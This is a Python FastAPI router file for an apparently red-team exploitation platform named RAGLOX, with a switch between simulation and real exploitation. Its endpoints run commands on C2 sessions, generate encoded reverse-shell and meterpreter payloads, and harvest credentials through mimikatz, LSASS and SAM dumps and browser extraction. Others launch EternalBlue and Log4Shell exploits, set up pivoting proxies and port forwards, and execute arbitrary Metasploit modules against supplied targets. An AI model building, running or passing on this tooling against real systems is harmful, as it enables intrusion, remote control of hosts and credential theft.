# ═══════════════════════════════════════════════════════════════
# RAGLOX v3.0 - Exploitation & C2 API Routes
# Real-time session management and exploitation monitoring
# ═══════════════════════════════════════════════════════════════

import logging
from typing import Dict, List, Optional, Any
from fastapi import APIRouter, HTTPException, status, Depends, Request
from pydantic import BaseModel, Field

logger = logging.getLogger("raglox.api.exploitation")

router = APIRouter(prefix="/exploitation", tags=["Exploitation"])


# ═══════════════════════════════════════════════════════════════
# Request/Response Models
# ═══════════════════════════════════════════════════════════════

class C2SessionInfo(BaseModel):
    """C2 Session information."""
    session_id: str
    target_host: str
    target_port: int
    session_type: str  # "ssh", "meterpreter", "shell", etc.
    status: str  # "active", "inactive", "error"
    created_at: str
    last_heartbeat: Optional[str] = None
    encryption_enabled: bool
    privilege_level: Optional[str] = None
    commands_executed: int = 0
    data_exfiltrated_bytes: int = 0


class C2CommandRequest(BaseModel):
    """Execute command on C2 session."""
    session_id: str = Field(..., description="Target C2 session ID")
    command: str = Field(..., description="Command to execute")
    timeout: int = Field(default=30, description="Command timeout in seconds")


class C2CommandResponse(BaseModel):
    """C2 command execution result."""
    success: bool
    session_id: str
    command: str
    output: Optional[str] = None
    error: Optional[str] = None
    execution_time: float
    timestamp: str


class ExploitStatusRequest(BaseModel):
    """Request exploit status."""
    exploit_id: Optional[str] = None
    target_id: Optional[str] = None


class ExploitStatusResponse(BaseModel):
    """Exploit execution status."""
    exploit_id: str
    target_id: str
    status: str  # "pending", "running", "success", "failed"
    exploit_type: str
    started_at: str
    completed_at: Optional[str] = None
    session_id: Optional[str] = None
    error: Optional[str] = None


class SessionProxyRequest(BaseModel):
    """Setup SOCKS proxy via session."""
    session_id: str
    proxy_port: int = Field(default=1080, description="Local SOCKS proxy port")
    proxy_type: str = Field(default="socks5", description="Proxy type: socks4/socks5")


class ExploitInfo(BaseModel):
    """Exploit metadata."""
    exploit_id: str
    name: str
    description: str
    cve_ids: List[str]
    platforms: List[str]
    targets: List[str]
    reliability: str
    exploit_type: str
    success_rate: float
    total_attempts: int = 0
    successful_attempts: int = 0


class PayloadRequest(BaseModel):
    """Generate custom payload."""
    payload_type: str = Field(..., description="meterpreter, reverse_shell, bind_shell, etc.")
    target_os: str = Field(..., description="windows, linux, macos")
    architecture: str = Field(default="x64", description="x86, x64, arm")
    lhost: str = Field(..., description="Listener host")
    lport: int = Field(..., description="Listener port")
    encoder: Optional[str] = Field(None, description="shikata_ga_nai, xor, etc.")
    iterations: int = Field(default=1, description="Encoding iterations")


class PayloadResponse(BaseModel):
    """Generated payload."""
    success: bool
    payload_type: str
    payload_data: str
    payload_size: int
    encoded: bool
    encoder: Optional[str] = None


class CredentialHarvestRequest(BaseModel):
    """Harvest credentials request."""
    session_id: str
    harvest_type: str = Field(..., description="mimikatz, lsass, sam, browsers")
    target_path: Optional[str] = None


class PortForwardRequest(BaseModel):
    """Port forwarding request."""
    session_id: str
    local_port: int
    remote_host: str
    remote_port: int


# ═══════════════════════════════════════════════════════════════
# C2 Session Management Endpoints
# ═══════════════════════════════════════════════════════════════

@router.get("/c2/sessions", response_model=List[C2SessionInfo])
async def list_c2_sessions(
    request: Request,
    mission_id: Optional[str] = None,
    status: Optional[str] = None
) -> List[C2SessionInfo]:
    """
    List all active C2 sessions.
    
    Args:
        mission_id: Filter by mission ID (optional)
        status: Filter by status: active/inactive/error (optional)
    
    Returns:
        List of C2 session information
    """
    try:
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not initialized. Enable USE_REAL_EXPLOITS=true"
            )
        
        # Get all sessions
        sessions = await c2_manager.list_sessions()
        
        # Apply filters
        if mission_id:
            sessions = [s for s in sessions if s.get('mission_id') == mission_id]
        if status:
            sessions = [s for s in sessions if s.get('status') == status]
        
        return [C2SessionInfo(**s) for s in sessions]
        
    except Exception as e:
        logger.error(f"Failed to list C2 sessions: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to list C2 sessions: {str(e)}"
        )


@router.get("/c2/sessions/{session_id}", response_model=C2SessionInfo)
async def get_c2_session(
    request: Request,
    session_id: str
) -> C2SessionInfo:
    """
    Get detailed information about a specific C2 session.
    
    Args:
        session_id: C2 session ID
    
    Returns:
        C2 session information
    """
    try:
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not initialized"
            )
        
        session = await c2_manager.get_session(session_id)
        
        if not session:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail=f"C2 session {session_id} not found"
            )
        
        return C2SessionInfo(**session)
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to get C2 session: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get C2 session: {str(e)}"
        )


@router.post("/c2/sessions/{session_id}/execute", response_model=C2CommandResponse)
async def execute_c2_command(
    request: Request,
    session_id: str,
    command_request: C2CommandRequest
) -> C2CommandResponse:
    """
    Execute a command on a C2 session.
    
    Args:
        session_id: Target C2 session ID
        command_request: Command details
    
    Returns:
        Command execution result
    """
    try:
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not initialized"
            )
        
        # Execute command
        result = await c2_manager.execute_command(
            session_id=session_id,
            command=command_request.command,
            timeout=command_request.timeout
        )
        
        return C2CommandResponse(**result)
        
    except Exception as e:
        logger.error(f"Failed to execute command: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to execute command: {str(e)}"
        )


@router.delete("/c2/sessions/{session_id}")
async def terminate_c2_session(
    request: Request,
    session_id: str
) -> Dict[str, str]:
    """
    Terminate a C2 session.
    
    Args:
        session_id: C2 session ID to terminate
    
    Returns:
        Success message
    """
    try:
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not initialized"
            )
        
        await c2_manager.terminate_session(session_id)
        
        return {
            "status": "success",
            "message": f"C2 session {session_id} terminated"
        }
        
    except Exception as e:
        logger.error(f"Failed to terminate session: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to terminate session: {str(e)}"
        )


@router.post("/c2/sessions/{session_id}/proxy", response_model=Dict[str, Any])
async def setup_socks_proxy(
    request: Request,
    session_id: str,
    proxy_request: SessionProxyRequest
) -> Dict[str, Any]:
    """
    Setup SOCKS proxy through a C2 session for network pivoting.
    
    Args:
        session_id: C2 session to use for proxy
        proxy_request: Proxy configuration
    
    Returns:
        Proxy connection details
    """
    try:
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not initialized"
            )
        
        # Setup SOCKS proxy
        proxy_info = await c2_manager.setup_proxy(
            session_id=session_id,
            proxy_port=proxy_request.proxy_port,
            proxy_type=proxy_request.proxy_type
        )
        
        return {
            "status": "success",
            "proxy_type": proxy_request.proxy_type,
            "proxy_host": "127.0.0.1",
            "proxy_port": proxy_request.proxy_port,
            "session_id": session_id,
            "message": f"SOCKS proxy established on port {proxy_request.proxy_port}"
        }
        
    except Exception as e:
        logger.error(f"Failed to setup proxy: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to setup proxy: {str(e)}"
        )


# ═══════════════════════════════════════════════════════════════
# Exploitation Status & Monitoring
# ═══════════════════════════════════════════════════════════════

@router.get("/status/metasploit", response_model=Dict[str, Any])
async def get_metasploit_status(request: Request) -> Dict[str, Any]:
    """
    Get Metasploit RPC connection status.
    
    Returns:
        Metasploit connection and version information
    """
    try:
        metasploit_adapter = getattr(request.app.state, 'metasploit_adapter', None)
        use_real_exploits = getattr(request.app.state, 'use_real_exploits', False)
        
        if not use_real_exploits:
            return {
                "status": "disabled",
                "message": "Real exploitation disabled. Set USE_REAL_EXPLOITS=true",
                "mode": "simulation"
            }
        
        if not metasploit_adapter:
            return {
                "status": "unavailable",
                "message": "Metasploit RPC adapter not initialized",
                "mode": "simulation"
            }
        
        # Get Metasploit version and stats
        version = await metasploit_adapter.get_version()
        exploits = await metasploit_adapter.list_exploits()
        
        return {
            "status": "connected",
            "mode": "real_exploitation",
            "version": version,
            "total_exploits": len(exploits) if exploits else 0,
            "connection": {
                "host": metasploit_adapter.host,
                "port": metasploit_adapter.port,
                "ssl": metasploit_adapter.ssl
            }
        }
        
    except Exception as e:
        logger.error(f"Failed to get Metasploit status: {e}")
        return {
            "status": "error",
            "message": str(e),
            "mode": "simulation"
        }


@router.get("/status/exploitation", response_model=Dict[str, Any])
async def get_exploitation_status(request: Request) -> Dict[str, Any]:
    """
    Get overall exploitation framework status.
    
    Returns:
        Exploitation framework health and statistics
    """
    try:
        use_real_exploits = getattr(request.app.state, 'use_real_exploits', False)
        metasploit_adapter = getattr(request.app.state, 'metasploit_adapter', None)
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        return {
            "mode": "real_exploitation" if use_real_exploits else "simulation",
            "metasploit": {
                "enabled": use_real_exploits,
                "connected": metasploit_adapter is not None and await metasploit_adapter.is_connected()
            },
            "c2": {
                "enabled": c2_manager is not None,
                "active_sessions": len(await c2_manager.list_sessions()) if c2_manager else 0
            },
            "capabilities": {
                "real_exploits": use_real_exploits and metasploit_adapter is not None,
                "post_exploitation": c2_manager is not None,
                "network_pivoting": c2_manager is not None,
                "credential_harvesting": c2_manager is not None
            }
        }
        
    except Exception as e:
        logger.error(f"Failed to get exploitation status: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get exploitation status: {str(e)}"
        )


# ═══════════════════════════════════════════════════════════════
# Health Check
# ═══════════════════════════════════════════════════════════════

@router.get("/health", response_model=Dict[str, Any])
async def exploitation_health_check(request: Request) -> Dict[str, Any]:
    """
    Health check for exploitation framework.
    
    Returns:
        Health status of all exploitation components
    """
    try:
        use_real_exploits = getattr(request.app.state, 'use_real_exploits', False)
        metasploit_adapter = getattr(request.app.state, 'metasploit_adapter', None)
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        
        health = {
            "status": "healthy",
            "mode": "real_exploitation" if use_real_exploits else "simulation",
            "components": {}
        }
        
        # Check Metasploit
        if use_real_exploits and metasploit_adapter:
            try:
                connected = await metasploit_adapter.is_connected()
                health["components"]["metasploit"] = {
                    "status": "healthy" if connected else "unhealthy",
                    "connected": connected
                }
            except Exception as e:
                health["components"]["metasploit"] = {
                    "status": "unhealthy",
                    "error": str(e)
                }
                health["status"] = "degraded"
        
        # Check C2
        if c2_manager:
            try:
                sessions = await c2_manager.list_sessions()
                health["components"]["c2"] = {
                    "status": "healthy",
                    "active_sessions": len(sessions)
                }
            except Exception as e:
                health["components"]["c2"] = {
                    "status": "unhealthy",
                    "error": str(e)
                }
                health["status"] = "degraded"
        
        return health
        
    except Exception as e:
        logger.error(f"Health check failed: {e}")
        return {
            "status": "unhealthy",
            "error": str(e)
        }


# ═══════════════════════════════════════════════════════════════
# Exploit Repository Endpoints
# ═══════════════════════════════════════════════════════════════

@router.get("/exploits", response_model=List[ExploitInfo])
async def list_exploits(
    request: Request,
    platform: Optional[str] = None,
    cve_id: Optional[str] = None,
    min_reliability: Optional[str] = None
) -> List[ExploitInfo]:
    """
    List all available exploits from ExploitRepository.
    
    Args:
        platform: Filter by platform (windows, linux, etc.)
        cve_id: Filter by CVE ID
        min_reliability: Minimum reliability (excellent, great, good, normal)
    
    Returns:
        List of exploit information
    """
    try:
        from ..exploitation.knowledge.exploit_repository import get_exploit_repository
        
        repo = get_exploit_repository()
        exploits = repo.query_exploits(
            platform=platform,
            cve_id=cve_id,
            min_reliability=min_reliability
        )
        
        return [ExploitInfo(**exploit.dict()) for exploit in exploits]
        
    except Exception as e:
        logger.error(f"Failed to list exploits: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to list exploits: {str(e)}"
        )


@router.get("/exploits/{exploit_id}", response_model=ExploitInfo)
async def get_exploit(request: Request, exploit_id: str) -> ExploitInfo:
    """Get detailed information about a specific exploit."""
    try:
        from ..exploitation.knowledge.exploit_repository import get_exploit_repository
        
        repo = get_exploit_repository()
        exploit = repo.get_exploit(exploit_id)
        
        if not exploit:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail=f"Exploit {exploit_id} not found"
            )
        
        return ExploitInfo(**exploit.dict())
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to get exploit: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get exploit: {str(e)}"
        )


@router.get("/exploits/cve/{cve_id}", response_model=List[ExploitInfo])
async def find_exploits_by_cve(request: Request, cve_id: str) -> List[ExploitInfo]:
    """Find exploits by CVE ID."""
    try:
        from ..exploitation.knowledge.exploit_repository import get_exploit_repository
        
        repo = get_exploit_repository()
        exploits = repo.query_exploits(cve_id=cve_id)
        
        return [ExploitInfo(**exploit.dict()) for exploit in exploits]
        
    except Exception as e:
        logger.error(f"Failed to find exploits by CVE: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to find exploits: {str(e)}"
        )


@router.get("/exploits/stats", response_model=Dict[str, Any])
async def get_exploit_stats(request: Request) -> Dict[str, Any]:
    """Get exploit repository statistics."""
    try:
        from ..exploitation.knowledge.exploit_repository import get_exploit_repository
        
        repo = get_exploit_repository()
        stats = repo.get_statistics()
        
        return stats
        
    except Exception as e:
        logger.error(f"Failed to get exploit stats: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to get exploit stats: {str(e)}"
        )


# ═══════════════════════════════════════════════════════════════
# Payload Generation Endpoints
# ═══════════════════════════════════════════════════════════════

@router.post("/payloads/generate", response_model=PayloadResponse)
async def generate_payload(
    request: Request,
    payload_request: PayloadRequest
) -> PayloadResponse:
    """
    Generate a custom payload.
    
    Args:
        payload_request: Payload configuration
    
    Returns:
        Generated payload data
    """
    try:
        from ..exploitation.payloads.payload_generator import get_payload_generator
        
        generator = get_payload_generator()
        
        # Generate payload
        result = await generator.generate_payload(
            payload_type=payload_request.payload_type,
            lhost=payload_request.lhost,
            lport=payload_request.lport,
            target_os=payload_request.target_os,
            architecture=payload_request.architecture,
            encoder=payload_request.encoder,
            iterations=payload_request.iterations
        )
        
        return PayloadResponse(
            success=result.get("success", False),
            payload_type=payload_request.payload_type,
            payload_data=result.get("payload", ""),
            payload_size=len(result.get("payload", "")),
            encoded=payload_request.encoder is not None,
            encoder=payload_request.encoder
        )
        
    except Exception as e:
        logger.error(f"Failed to generate payload: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to generate payload: {str(e)}"
        )


@router.get("/payloads/types", response_model=List[str])
async def list_payload_types(request: Request) -> List[str]:
    """List available payload types."""
    return [
        "reverse_shell",
        "bind_shell",
        "meterpreter",
        "meterpreter_reverse_tcp",
        "meterpreter_bind_tcp",
        "meterpreter_reverse_https",
        "windows_shell",
        "linux_shell",
        "powershell",
        "shellcode"
    ]


# ═══════════════════════════════════════════════════════════════
# Post-Exploitation: Credential Harvesting
# ═══════════════════════════════════════════════════════════════

@router.post("/post-exploitation/harvest", response_model=Dict[str, Any])
async def harvest_credentials(
    request: Request,
    harvest_request: CredentialHarvestRequest
) -> Dict[str, Any]:
    """
    Harvest credentials from a compromised host.
    
    Args:
        harvest_request: Harvesting configuration
    
    Returns:
        Harvested credentials
    """
    try:
        from ..exploitation.post_exploitation.credential_harvester import CredentialHarvester
        
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not available"
            )
        
        harvester = CredentialHarvester(c2_manager=c2_manager)
        
        # Harvest based on type
        if harvest_request.harvest_type == "mimikatz":
            result = await harvester.run_mimikatz(harvest_request.session_id)
        elif harvest_request.harvest_type == "lsass":
            result = await harvester.dump_lsass(harvest_request.session_id)
        elif harvest_request.harvest_type == "sam":
            result = await harvester.dump_sam(harvest_request.session_id)
        elif harvest_request.harvest_type == "browsers":
            result = await harvester.extract_browser_credentials(harvest_request.session_id)
        else:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail=f"Invalid harvest type: {harvest_request.harvest_type}"
            )
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to harvest credentials: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to harvest credentials: {str(e)}"
        )


# ═══════════════════════════════════════════════════════════════
# Post-Exploitation: Network Pivoting
# ═══════════════════════════════════════════════════════════════

@router.post("/pivoting/port-forward", response_model=Dict[str, Any])
async def setup_port_forward(
    request: Request,
    forward_request: PortForwardRequest
) -> Dict[str, Any]:
    """Setup port forwarding through a compromised host."""
    try:
        from ..exploitation.post_exploitation.network_pivoting import NetworkPivoting
        
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        if not c2_manager:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="C2 Session Manager not available"
            )
        
        pivoting = NetworkPivoting(c2_manager=c2_manager)
        
        result = await pivoting.setup_port_forward(
            session_id=forward_request.session_id,
            local_port=forward_request.local_port,
            remote_host=forward_request.remote_host,
            remote_port=forward_request.remote_port
        )
        
        return result
        
    except Exception as e:
        logger.error(f"Failed to setup port forward: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to setup port forward: {str(e)}"
        )


@router.get("/pivoting/routes", response_model=List[Dict[str, Any]])
async def list_pivot_routes(request: Request, session_id: Optional[str] = None) -> List[Dict[str, Any]]:
    """List all active pivot routes."""
    try:
        from ..exploitation.post_exploitation.network_pivoting import NetworkPivoting
        
        c2_manager = getattr(request.app.state, 'c2_manager', None)
        if not c2_manager:
            return []
        
        pivoting = NetworkPivoting(c2_manager=c2_manager)
        routes = await pivoting.list_routes(session_id=session_id)
        
        return routes
        
    except Exception as e:
        logger.error(f"Failed to list pivot routes: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to list routes: {str(e)}"
        )


# ═══════════════════════════════════════════════════════════════
# Specific Exploit Execution Endpoints
# ═══════════════════════════════════════════════════════════════

@router.post("/exploits/eternalblue/execute", response_model=Dict[str, Any])
async def execute_eternalblue(
    request: Request,
    target_host: str,
    target_port: int = 445,
    lhost: Optional[str] = None,
    lport: int = 4444
) -> Dict[str, Any]:
    """
    Execute EternalBlue (MS17-010) exploit against target.
    
    Args:
        target_host: Target Windows host
        target_port: SMB port (default 445)
        lhost: Listener host for reverse shell
        lport: Listener port
    
    Returns:
        Exploit execution result
    """
    try:
        from ..exploitation.exploits.eternalblue import EternalBlueExploit
        from ..exploitation.adapters.metasploit_adapter import get_metasploit_adapter
        
        metasploit = get_metasploit_adapter()
        exploit = EternalBlueExploit(metasploit_adapter=metasploit)
        
        result = await exploit.execute(
            target_host=target_host,
            target_port=target_port,
            lhost=lhost or request.app.state.settings.lhost,
            lport=lport
        )
        
        return result
        
    except Exception as e:
        logger.error(f"EternalBlue exploit failed: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Exploit failed: {str(e)}"
        )


@router.post("/exploits/eternalblue/check", response_model=Dict[str, Any])
async def check_eternalblue(
    request: Request,
    target_host: str,
    target_port: int = 445
) -> Dict[str, Any]:
    """
    Check if target is vulnerable to EternalBlue.
    
    Args:
        target_host: Target Windows host
        target_port: SMB port (default 445)
    
    Returns:
        Vulnerability check result
    """
    try:
        from ..exploitation.exploits.eternalblue import EternalBlueExploit
        from ..exploitation.adapters.metasploit_adapter import get_metasploit_adapter
        
        metasploit = get_metasploit_adapter()
        exploit = EternalBlueExploit(metasploit_adapter=metasploit)
        
        result = await exploit.check_vulnerability(
            target_host=target_host,
            target_port=target_port
        )
        
        return result
        
    except Exception as e:
        logger.error(f"Vulnerability check failed: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Check failed: {str(e)}"
        )


@router.post("/exploits/log4shell/execute", response_model=Dict[str, Any])
async def execute_log4shell(
    request: Request,
    target_url: str,
    target_port: int = 8080,
    lhost: Optional[str] = None,
    lport: int = 4444,
    jndi_payload: Optional[str] = None
) -> Dict[str, Any]:
    """
    Execute Log4Shell (CVE-2021-44228) exploit against target.
    
    Args:
        target_url: Target URL with Log4j
        target_port: Target port
        lhost: Listener host for reverse shell
        lport: Listener port
        jndi_payload: Custom JNDI payload (optional)
    
    Returns:
        Exploit execution result
    """
    try:
        from ..exploitation.exploits.log4shell import Log4ShellExploit
        from ..exploitation.adapters.metasploit_adapter import get_metasploit_adapter
        
        metasploit = get_metasploit_adapter()
        exploit = Log4ShellExploit(metasploit_adapter=metasploit)
        
        result = await exploit.execute(
            target_url=target_url,
            target_port=target_port,
            lhost=lhost or request.app.state.settings.lhost,
            lport=lport,
            jndi_payload=jndi_payload
        )
        
        return result
        
    except Exception as e:
        logger.error(f"Log4Shell exploit failed: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Exploit failed: {str(e)}"
        )


@router.post("/exploits/log4shell/scan", response_model=Dict[str, Any])
async def scan_log4shell(
    request: Request,
    target_url: str
) -> Dict[str, Any]:
    """
    Scan target for Log4Shell vulnerability.
    
    Args:
        target_url: Target URL to scan
    
    Returns:
        Scan result with vulnerability status
    """
    try:
        from ..exploitation.exploits.log4shell import Log4ShellExploit
        from ..exploitation.adapters.metasploit_adapter import get_metasploit_adapter
        
        metasploit = get_metasploit_adapter()
        exploit = Log4ShellExploit(metasploit_adapter=metasploit)
        
        result = await exploit.scan_vulnerability(target_url=target_url)
        
        return result
        
    except Exception as e:
        logger.error(f"Log4Shell scan failed: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Scan failed: {str(e)}"
        )


# ═══════════════════════════════════════════════════════════════
# Metasploit Direct Interaction
# ═══════════════════════════════════════════════════════════════

@router.get("/metasploit/modules", response_model=List[str])
async def list_metasploit_modules(
    request: Request,
    module_type: Optional[str] = None
) -> List[str]:
    """
    List available Metasploit modules.
    
    Args:
        module_type: Filter by type (exploit, auxiliary, post, etc.)
    
    Returns:
        List of module names
    """
    try:
        metasploit_adapter = getattr(request.app.state, 'metasploit_adapter', None)
        
        if not metasploit_adapter:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="Metasploit adapter not available"
            )
        
        modules = await metasploit_adapter.list_modules(module_type=module_type)
        
        return modules
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to list Metasploit modules: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to list modules: {str(e)}"
        )


@router.post("/metasploit/execute", response_model=Dict[str, Any])
async def execute_metasploit_module(
    request: Request,
    module_name: str,
    options: Dict[str, Any]
) -> Dict[str, Any]:
    """
    Execute a Metasploit module with custom options.
    
    Args:
        module_name: Full module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
        options: Module options (RHOSTS, RPORT, LHOST, LPORT, etc.)
    
    Returns:
        Execution result
    """
    try:
        metasploit_adapter = getattr(request.app.state, 'metasploit_adapter', None)
        
        if not metasploit_adapter:
            raise HTTPException(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                detail="Metasploit adapter not available"
            )
        
        result = await metasploit_adapter.execute_module(
            module_name=module_name,
            options=options
        )
        
        return result
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to execute Metasploit module: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Module execution failed: {str(e)}"
        )
